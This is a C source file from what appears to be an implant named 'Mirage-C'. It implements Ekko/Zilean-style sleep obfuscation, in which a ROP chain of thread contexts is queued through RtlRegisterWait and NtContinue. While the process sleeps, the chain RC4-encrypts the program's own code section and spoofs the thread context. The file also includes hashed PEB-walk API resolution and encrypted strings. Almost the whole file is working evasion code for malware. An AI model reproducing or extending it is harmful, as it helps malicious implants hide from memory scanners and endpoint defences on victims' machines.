/*
 * sleep_obfusc.c — Zilean-style sleep obfuscation for Mirage-C
 *
 * Restructured Ekko: the encrypt/sleep/decrypt sequence now runs as a
 * ROP chain of CONTEXTs executed via RtlRegisterWait + NtContinue on a
 * thread-pool worker thread — the entire sequence lives OUTSIDE the
 * encrypted .text range, fixing the old self-crash where the code that
 * called SystemFunction032/NtDelayExecution sat on a page it had just
 * encrypted.
 *
 * Chain (per NocturneLdr/src/Zilean.cpp MaskImage):
 *   0. SetEvent (chain start ack — worker is alive)
 *   1. NtProtectVirtualMemory(.text -> RW)
 *   2. SystemFunction032 (RC4 encrypt)
 *   3. NtGetContextThread (save real context)
 *   4. NtSetContextThread (spoof to captured worker context)
 *   5. WaitForSingleObjectEx (timeout = sleep)
 *   6. NtSetContextThread (restore real context)
 *   7. SystemFunction032 (RC4 decrypt)
 *   8. NtProtectVirtualMemory(.text -> RX)
 *   9. SetEvent (hWakeEvent — wakes the sleeping main thread)
 *
 * All function pointers are resolved BEFORE any encryption happens;
 * build_rop_chain() is a pure function over its inputs (host-testable,
 * no Windows state) — tests/test_sleep_chain.c locks its register
 * assignments.
 *
 * Fallback: plain NtDelayExecution without encryption when
 * RtlRegisterWait (or any chain function) is unavailable.
 *
 * CRT-free — PEB-walk API resolution, mirage_Nt* syscall wrappers.
 */


#ifdef TEST_SLEEP_CHAIN
/* Host-test mode: only the pure ROP-chain builder is compiled; the
 * Windows runtime (PEB walk, syscall wrappers) is excluded. */
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#else
#include "sleep_obfusc.h"
#include "config.h"
#include "engine.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include "nt_types.h"
#include <stdint.h>
#include <stddef.h>
#endif

/* ── PE constants ──────────────────────────────────────────── */
#ifndef IMAGE_SCN_MEM_EXECUTE
#define IMAGE_SCN_MEM_EXECUTE  0x20000000
#endif

#ifndef PAGE_READWRITE
#define PAGE_READWRITE         0x04
#endif

#ifndef PAGE_EXECUTE_READ
#define PAGE_EXECUTE_READ      0x20
#endif

#ifndef PAGE_SIZE
#define PAGE_SIZE              0x1000
#endif

#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)

/* ── USTRING for SystemFunction032 ─────────────────────────── */
typedef struct _USTRING {
    DWORD           Length;
    DWORD           MaximumLength;
    unsigned char  *Buffer;
} USTRING;

/* ── Chain function-pointer table (resolved before encryption) ── */
typedef NTSTATUS (NTAPI *pSystemFunction032)(USTRING *data, USTRING *key);
typedef NTSTATUS (NTAPI *pRtlRegisterWait)(HANDLE *NewWaitObject, HANDLE TimerQueueHandle,
    void *CallBack, void *Context, ULONG DueTime, ULONG Flags);
typedef NTSTATUS (NTAPI *pNtContinue)(PCONTEXT ctx, BOOLEAN RaiseAlert);
typedef void     (WINAPI *pWaitForSingleObjectEx_t)(HANDLE, DWORD, BOOL);
typedef BOOL     (WINAPI *pSetEvent_t)(HANDLE);
typedef NTSTATUS (NTAPI *pRtlCaptureContext_t)(PCONTEXT);
typedef NTSTATUS (NTAPI *pNtSignalAndWait)(HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pNtDuplicateObject)(HANDLE, HANDLE, HANDLE, HANDLE *,
    ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *pNtSetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, SIZE_T *,
    ULONG, ULONG *);

#ifndef EVENT_ALL_ACCESS
#define EVENT_ALL_ACCESS 0x1F0003
#endif

/* WT flags (winnt.h may be absent under -nostdlib builds) */
#ifndef WT_EXECUTEINWAITTHREAD
#define WT_EXECUTEINWAITTHREAD   0x00000004
#define WT_EXECUTEONLYONCE       0x00000008
#endif

/* CONTEXT_ALL — must be present (winnt.h supplies it via windows.h) */
#ifndef CONTEXT_FULL
#define CONTEXT_FULL 0x10000B
#endif

#define SLEEP_CHAIN_STEPS 10

/* ── Static state (runtime only — excluded from host test builds) ── */
#ifndef TEST_SLEEP_CHAIN
static struct {
    void             *text_va;
    SIZE_T            text_size;
    pSystemFunction032 pSysFunc032;
    int               ready;
} g_ekko;

/* RC4 key material for the chain steps (USTRINGs consumed by
 * SystemFunction032; static so the ROP CONTEXTs can point at them). */
static USTRING g_ekko_rc4_key;      /* key USTRING */
static USTRING g_ekko_rc4_keystr;   /* data USTRING aliasing .text */
static uint8_t g_ekko_key_bytes[16];

/* Saved real thread context (step 3 writes, step 6 restores). */
static CONTEXT g_ekko_ctx_backup __attribute__((aligned(16)));
static CONTEXT g_ekko_ctx_spoof  __attribute__((aligned(16)));

/*
 * g_rop_ctx — ROP chain CONTEXT storage. Static + 16-aligned (NtContinue
 * and NtGetContextThread require 16-byte-aligned CONTEXT on x64).
 */
static CONTEXT g_rop_ctx[SLEEP_CHAIN_STEPS] __attribute__((aligned(16)));
#endif /* !TEST_SLEEP_CHAIN */

/* ── build_rop_chain inputs (all resolved pre-encryption) ───── */
typedef struct {
    pSetEvent_t         fn_setevent;     /* step 0 + 9 */
    pWaitForSingleObjectEx_t fn_wait_ex; /* step 5 */
    pSystemFunction032  fn_sysfunc032;   /* steps 2 + 7 */
    pNtGetContextThread fn_nt_get_ctx;   /* step 3 */
    pNtSetContextThread fn_nt_set_ctx;   /* steps 4 + 6 */
    pNtProtectVirtualMemory fn_nt_protect; /* steps 1 + 8 */
    pNtContinue         fn_nt_continue;  /* chain driver */
    pRtlRegisterWait    fn_rtl_register; /* chain driver */
    pNtSignalAndWait    fn_nt_signal;    /* main-thread block */
    pRtlCaptureContext_t fn_rtl_capture; /* worker ctx capture */
    pNtDuplicateObject  fn_nt_duplicate; /* thread handle dup */
    HANDLE  event_ack;              /* step 0 SetEvent arg */
    HANDLE  event_wake;             /* step 9 SetEvent arg */
    HANDLE  thread;                 /* duplicated thread handle */
    void   *text_va;                /* .text base */
    SIZE_T  text_size;              /* .text size */
    DWORD   timeout_ms;             /* sleep duration */
    PCONTEXT template_ctx;          /* worker context template (Rsp base) */
    void   *rc4_key;                /* USTRING key (step 2+7 Rcx) */
    void   *rc4_data;               /* USTRING data (step 2+7 Rdx) */
    void   *ctx_backup;             /* CONTEXT backup (steps 3+6 Rdx) */
} rop_chain_inputs_t;

/*
 * build_rop_chain — pure function: fill the 10-step CONTEXT chain.
 *
 * Register assignments (win64): Rcx, Rdx, R8, R9 per step; Rsp starts at
 * template_ctx->Rsp and is decremented 8 per entry so every CONTEXT's
 * return slot lives below the previous one (stack grows down through the
 * chain without colliding). No Windows calls — host-testable.
 */
#ifdef TEST_SLEEP_CHAIN
/* Host-test mode: visible (non-static), inputs passed as void* so the
 * test can pass its own mirror struct without needing the private
 * typedef. The cast mirrors the test's layout-compatible struct. */
void build_rop_chain(PCONTEXT rop, size_t rop_count, const void *inputs);
void build_rop_chain(PCONTEXT rop, size_t rop_count, const void *inputs) {
    const rop_chain_inputs_t *in = (const rop_chain_inputs_t *)inputs;
#else
static void build_rop_chain(PCONTEXT rop, size_t rop_count,
                            const rop_chain_inputs_t *in) {
#endif
    for (size_t i = 0; i < rop_count; i++) {
        rop[i] = *in->template_ctx;
        rop[i].Rsp -= (DWORD64)(8 * (i + 1));
    }

    /* 0. SetEvent(event_ack) — chain start ack */
    rop[0].Rip = (DWORD64)(uintptr_t)in->fn_setevent;
    rop[0].Rcx = (DWORD64)(uintptr_t)in->event_ack;

    /* 1. NtProtectVirtualMemory(NtCurrentProcess, &text, &size, RW, &old) */
    rop[1].Rip = (DWORD64)(uintptr_t)in->fn_nt_protect;
    rop[1].Rcx = (DWORD64)(uintptr_t)(HANDLE)(intptr_t)-1;
    rop[1].Rdx = (DWORD64)(uintptr_t)&in->text_va;
    rop[1].R8  = (DWORD64)(uintptr_t)&in->text_size;
    rop[1].R9  = (DWORD64)PAGE_READWRITE;

    /* 2. SystemFunction032(&data, &key) — encrypt */
    rop[2].Rip = (DWORD64)(uintptr_t)in->fn_sysfunc032;
    rop[2].Rcx = (DWORD64)(uintptr_t)in->rc4_key;
    rop[2].Rdx = (DWORD64)(uintptr_t)in->rc4_data;

    /* 3. NtGetContextThread(thread, &backup) — save real context */
    rop[3].Rip = (DWORD64)(uintptr_t)in->fn_nt_get_ctx;
    rop[3].Rcx = (DWORD64)(uintptr_t)in->thread;
    rop[3].Rdx = (DWORD64)(uintptr_t)in->ctx_backup;

    /* 4. NtSetContextThread(thread, &spoof) — swap in worker context */
    rop[4].Rip = (DWORD64)(uintptr_t)in->fn_nt_set_ctx;
    rop[4].Rcx = (DWORD64)(uintptr_t)in->thread;
    rop[4].Rdx = (DWORD64)(uintptr_t)in->template_ctx;

    /* 5. WaitForSingleObjectEx(NtCurrentProcess, timeout, FALSE) — sleep */
    rop[5].Rip = (DWORD64)(uintptr_t)in->fn_wait_ex;
    rop[5].Rcx = (DWORD64)(uintptr_t)(HANDLE)(intptr_t)-1;
    rop[5].Rdx = (DWORD64)in->timeout_ms;
    rop[5].R8  = (DWORD64)(uintptr_t)FALSE;

    /* 6. NtSetContextThread(thread, &backup) — restore real context */
    rop[6].Rip = (DWORD64)(uintptr_t)in->fn_nt_set_ctx;
    rop[6].Rcx = (DWORD64)(uintptr_t)in->thread;
    rop[6].Rdx = (DWORD64)(uintptr_t)in->ctx_backup;

    /* 7. SystemFunction032(&data, &key) — decrypt (RC4 symmetric) */
    rop[7].Rip = (DWORD64)(uintptr_t)in->fn_sysfunc032;
    rop[7].Rcx = (DWORD64)(uintptr_t)in->rc4_key;
    rop[7].Rdx = (DWORD64)(uintptr_t)in->rc4_data;

    /* 8. NtProtectVirtualMemory(NtCurrentProcess, &text, &size, RX, &old) */
    rop[8].Rip = (DWORD64)(uintptr_t)in->fn_nt_protect;
    rop[8].Rcx = (DWORD64)(uintptr_t)(HANDLE)(intptr_t)-1;
    rop[8].Rdx = (DWORD64)(uintptr_t)&in->text_va;
    rop[8].R8  = (DWORD64)(uintptr_t)&in->text_size;
    rop[8].R9  = (DWORD64)PAGE_EXECUTE_READ;

    /* 9. SetEvent(event_wake) — wake the sleeping main thread */
    rop[9].Rip = (DWORD64)(uintptr_t)in->fn_setevent;
    rop[9].Rcx = (DWORD64)(uintptr_t)in->event_wake;
}

#ifndef TEST_SLEEP_CHAIN
/* ═══ Windows runtime (excluded from host test builds) ════════ */

/*
 * get_own_image_base — Return own ImageBaseAddress via PEB.
 * GS:[0x60] → PEB → 0x10 → ImageBaseAddress. Avoids calling
 * GetModuleHandleA(NULL) which may be hooked.
 */
static void *get_own_image_base(void) {
    void *peb;
#if defined(_M_X64) || defined(__x86_64__)
    peb = (void *)__readgsqword(0x60);
    return *(void **)((char *)peb + 0x10);
#else
    peb = (void *)__readfsdword(0x30);
    return *(void **)((char *)peb + 0x08);
#endif
}

/*
 * find_text_section — Walk own PE headers to locate .text bounds.
 * Returns 1 on success. Stores VA in *out_va, size in *out_size.
 */
static int find_text_section(void *base, uint8_t **out_va, SIZE_T *out_size) {
    uint8_t *bp = (uint8_t *)base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)bp;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(bp + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    uint16_t ns = nt->FileHeader.NumberOfSections;

    for (uint16_t i = 0; i < ns; i++) {
        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            sec[i].Misc.VirtualSize > 0) {
            *out_va   = bp + sec[i].VirtualAddress;
            *out_size = sec[i].Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

/* ── PEB-walk resolution helpers ───────────────────────────── */

static void *get_module_base(const unsigned char *enc_name, size_t enc_len) {
    char dll[32];
    enc_decrypt(enc_name, enc_len, dll);
    return mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
}

static void *get_func(void *mod, const unsigned char *enc_name, size_t enc_len) {
    char name[64];
    enc_decrypt(enc_name, enc_len, name);
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(name));
}



/*
 * resolve_chain_functions — resolve every function the ROP chain calls,
 * BEFORE any encryption. Returns 0 if anything is missing.
 */
static int resolve_chain_functions(rop_chain_inputs_t *in) {
    void *ntdll = get_module_base(enc_ntdll, ENC_NTDLL_LEN);
    void *k32   = get_module_base(enc_kernel32, ENC_KERNEL32_LEN);
    void *adv   = get_module_base(enc_advapi32, ENC_ADVAPI32_LEN);
    if (!ntdll || !k32 || !adv) return 0;

    in->fn_nt_continue   = (pNtContinue)get_func(ntdll, enc_NtContinue, ENC_NTCONTINUE_LEN);
    in->fn_rtl_register  = (pRtlRegisterWait)get_func(ntdll, enc_RtlRegisterWait, ENC_RTLREGISTERWAIT_LEN);
    in->fn_nt_signal     = (pNtSignalAndWait)get_func(ntdll, enc_NtSignalAndWaitForSingleObject, ENC_NTSIGNALANDWAITFORSINGLEOBJECT_LEN);
    in->fn_rtl_capture   = (pRtlCaptureContext_t)get_func(ntdll, enc_RtlCaptureContext, ENC_RTLCAPTURECONTEXT_LEN);
    in->fn_nt_get_ctx    = get_func(ntdll, enc_NtGetContextThread, ENC_NTGETCONTEXTTHREAD_LEN);
    in->fn_nt_set_ctx    = get_func(ntdll, enc_NtSetContextThread, ENC_NTSETCONTEXTTHREAD_LEN);
    in->fn_nt_protect    = (pNtProtectVirtualMemory)get_func(ntdll, enc_NtProtectVirtualMemory, ENC_NTPROTECTVIRTUALMEMORY_LEN);
    in->fn_nt_duplicate  = get_func(ntdll, enc_NtDuplicateObject, ENC_NTDUPLICATEOBJECT_LEN);
    in->fn_setevent      = (pSetEvent_t)get_func(k32, enc_SetEvent, ENC_SETEVENT_LEN);
    in->fn_wait_ex       = (pWaitForSingleObjectEx_t)get_func(k32, enc_WaitForSingleObjectEx, ENC_WAITFORSINGLEOBJECTEX_LEN);
    in->fn_sysfunc032    = (pSystemFunction032)get_func(adv, enc_SystemFunction032, ENC_SYSTEMFUNCTION032_LEN);

    return in->fn_nt_continue && in->fn_rtl_register && in->fn_nt_signal &&
           in->fn_rtl_capture && in->fn_nt_get_ctx && in->fn_nt_set_ctx &&
           in->fn_nt_protect && in->fn_nt_duplicate && in->fn_setevent &&
           in->fn_wait_ex && in->fn_sysfunc032;
}

/*
 * ekko_init — one-time init: find .text, resolve chain functions.
 */
static int ekko_init(void) {
    if (g_ekko.ready) return 1;

    void *base = get_own_image_base();
    if (!base) return 0;

    uint8_t *text_va = NULL;
    SIZE_T   text_sz = 0;
    if (!find_text_section(base, &text_va, &text_sz))
        return 0;
    if (text_sz == 0) return 0;

    g_ekko.text_va   = text_va;
    g_ekko.text_size = text_sz;
    g_ekko.ready     = 1;
    return 1;
}

/*
 * plain_sleep — fallback: NtDelayExecution without encryption.
 */
static void plain_sleep(DWORD milliseconds) {
    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)((LONGLONG)milliseconds * 10000LL);
    mirage_NtDelayExecution(FALSE, &delay);
}

/*
 * ekko_sleep — obfuscated sleep (Zilean-style).
 *
 * All code in this function runs BEFORE the .text range is encrypted;
 * after the chain is queued the main thread blocks in
 * NtSignalAndWaitForSingleObject, which lives in ntdll — outside the
 * encrypted window. The chain itself executes via RtlRegisterWait/NtContinue
 * from ntdll and kernel32 code, also outside .text.
 */
int ekko_sleep(DWORD milliseconds) {
    if (!ekko_init()) {
        plain_sleep(milliseconds);
        return 0;
    }

    /* ── Resolve every chain function BEFORE any encryption ── */
    rop_chain_inputs_t in = {0};
    if (!resolve_chain_functions(&in)) {
        plain_sleep(milliseconds);
        return 0;
    }

    /* ── Events: chain start ack + wake signal ── */
    HANDLE event_start = NULL, event_end = NULL;
    mirage_NtCreateEvent(&event_start, EVENT_ALL_ACCESS, NULL, 0, FALSE);
    mirage_NtCreateEvent(&event_end,   EVENT_ALL_ACCESS, NULL, 0, FALSE);
    if (!event_start || !event_end) {
        if (event_start) mirage_NtClose(event_start);
        if (event_end)   mirage_NtClose(event_end);
        plain_sleep(milliseconds);
        return 0;
    }
    /* ── Capture the thread-pool worker context (template + spoof) ──
     * Zilean race fix: queue RtlCaptureContext(ctx) followed by
     * SetEvent(event_start) on the same wait queue (SetEvent as the
     * callback, context = the event — the extra BOOLEAN arg the wait
     * machinery passes is ignored); waiting on event_start proves the
     * capture ran before the chain is queued. */
    HANDLE timer = NULL;
    NTSTATUS st;
    st = in.fn_rtl_register(&timer, NULL, (void *)in.fn_rtl_capture,
                 &g_ekko_ctx_spoof, 200, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE);
    if (!NT_SUCCESS(st)) {
        mirage_NtClose(event_start);
        mirage_NtClose(event_end);
        plain_sleep(milliseconds);
        return 0;
    }
    st = in.fn_rtl_register(&timer, NULL, (void *)in.fn_setevent,
                 event_start, 300, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE);
    if (!NT_SUCCESS(st)) {
        mirage_NtClose(event_start);
        mirage_NtClose(event_end);
        plain_sleep(milliseconds);
        return 0;
    }

    /* Block until the worker ran the capture (timeout 2s guard).
     * SignalAndWait(event_start, event_start): the signal is a no-op if
     * already set, and the wait releases when the SetEvent callback fires. */
    {
        LARGE_INTEGER tmo;
        tmo.QuadPart = -(LONGLONG)20000000LL; /* 2s */
        in.fn_nt_signal(event_start, event_start, FALSE, &tmo);
    }
    if (g_ekko_ctx_spoof.ContextFlags == 0) {
        mirage_NtClose(event_start);
        mirage_NtClose(event_end);
        plain_sleep(milliseconds);
        return 0;
    }
    g_ekko_ctx_spoof.ContextFlags = CONTEXT_FULL;

    /* ── Duplicate own thread handle for context save/restore ── */
    HANDLE thread = NULL;
    if (!NT_SUCCESS(in.fn_nt_duplicate((HANDLE)(intptr_t)-1,
                                       (HANDLE)(intptr_t)-2 /* NtCurrentThread pseudo */,
                                       (HANDLE)(intptr_t)-1, &thread, 0, 0, 0))) {
        mirage_NtClose(event_start);
        mirage_NtClose(event_end);
        plain_sleep(milliseconds);
        return 0;
    }


    /* ── RC4 key material (key + data USTRINGs; data aliases .text) ──
     * Key derived from image base + caller_page (same entropy source as
     * the pre-restructure code; static key, ponytail: randomize per-build
     * via poly.go if signature matters). */
    {
        uintptr_t base_addr = (uintptr_t)get_own_image_base();
        uintptr_t page      = ((uintptr_t)&g_ekko_rc4_key) & ~((uintptr_t)PAGE_SIZE - 1);
        for (int i = 0; i < 8; i++) {
            g_ekko_key_bytes[i]     = (uint8_t)(base_addr >> (i * 8)) ^ (uint8_t)i;
            g_ekko_key_bytes[i + 8] = (uint8_t)(page >> (i * 8)) ^ (uint8_t)(i + 8);
        }
    }
    g_ekko_rc4_key.Buffer        = g_ekko_key_bytes;
    g_ekko_rc4_key.Length        = 16;
    g_ekko_rc4_key.MaximumLength = 16;
    g_ekko_rc4_keystr.Buffer        = (unsigned char *)g_ekko.text_va;
    g_ekko_rc4_keystr.Length        = (DWORD)g_ekko.text_size;
    g_ekko_rc4_keystr.MaximumLength = (DWORD)g_ekko.text_size;

    /* ── Build the chain (pure function; no Windows calls) ── */
    in.event_ack  = event_start;
    in.event_wake = event_end;
    in.thread     = thread;
    in.text_va    = g_ekko.text_va;
    in.text_size  = g_ekko.text_size;
    in.timeout_ms = milliseconds;
    in.template_ctx = &g_ekko_ctx_spoof;
    in.rc4_key    = &g_ekko_rc4_key;
    in.rc4_data   = &g_ekko_rc4_keystr;
    in.ctx_backup = &g_ekko_ctx_backup;
    build_rop_chain(g_rop_ctx, SLEEP_CHAIN_STEPS, &in);

    /* ── Queue every step via RtlRegisterWait + NtContinue ── */
    int ok = 1;
    for (int i = 0; i < SLEEP_CHAIN_STEPS; i++) {
        if (!NT_SUCCESS(in.fn_rtl_register(&timer, NULL,
                (void *)in.fn_nt_continue, &g_rop_ctx[i],
                300 + (ULONG)i * 100,
                WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE))) {
            ok = 0;
            break;
        }
    }

    if (ok) {
        /* Main thread sleeps here — inside ntdll, outside .text.
         * Step 0 SetEvent(event_start) releases this wait. */
        in.fn_nt_signal(event_start, event_end, FALSE, NULL);
    } else {
        plain_sleep(milliseconds);
    }

    /* ── Cleanup ── */
    if (thread) mirage_NtClose(thread);
    mirage_NtClose(event_start);
    mirage_NtClose(event_end);
    mirage_NtFlushInstructionCache((HANDLE)(intptr_t)-1,
                                   g_ekko.text_va, g_ekko.text_size);
    return ok ? 1 : 0;
}

#endif /* TEST_SLEEP_CHAIN */
